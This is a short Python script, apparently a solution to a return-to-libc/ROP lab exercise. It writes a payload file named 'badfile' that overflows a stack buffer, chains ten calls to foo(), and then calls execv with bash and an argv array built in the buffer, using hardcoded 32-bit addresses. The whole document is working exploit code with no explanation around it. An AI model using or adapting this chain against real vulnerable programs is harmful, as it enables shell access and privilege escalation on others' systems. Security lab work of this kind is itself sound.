#!/usr/bin/env python3
import sys

# Fill content with non-zero values
content = bytearray(0xaa for i in range(300))

# Addresses
foo_addr = 0x565562b0
execv_addr = 0xf7e994b0
exit_addr = 0xf7e04f80
bash_addr = 0xffffde71
arg_addr = 0xffffde0c
input_addr = 0xffffcdd0

# Construct argv[] array at offset 100
argv_offset = 100
content[argv_offset:argv_offset+4] = (bash_addr).to_bytes(4, byteorder='little')
content[argv_offset+4:argv_offset+8] = (arg_addr).to_bytes(4, byteorder='little')
content[argv_offset+8:argv_offset+12] = (0).to_bytes(4, byteorder='little')

argv_addr = input_addr + argv_offset

# Build the ROP chain
offset = 28

# Chain 10 foo() calls
for i in range(10):
    content[offset:offset+4] = (foo_addr).to_bytes(4, byteorder='little')
    offset += 4

# After 10th foo, call execv()
content[offset:offset+4] = (execv_addr).to_bytes(4, byteorder='little')
offset += 4

# execv's return address (exit)
content[offset:offset+4] = (exit_addr).to_bytes(4, byteorder='little')
offset += 4

# execv's first argument (pathname)
content[offset:offset+4] = (bash_addr).to_bytes(4, byteorder='little')
offset += 4

# execv's second argument (argv array)
content[offset:offset+4] = (argv_addr).to_bytes(4, byteorder='little')

# Save content to a file
with open("badfile", "wb") as f:
    f.write(content)

print("ROP chain created!")
print(f"foo() address: {hex(foo_addr)}")
print(f"Chain length: 10 foo() calls -> execv()")
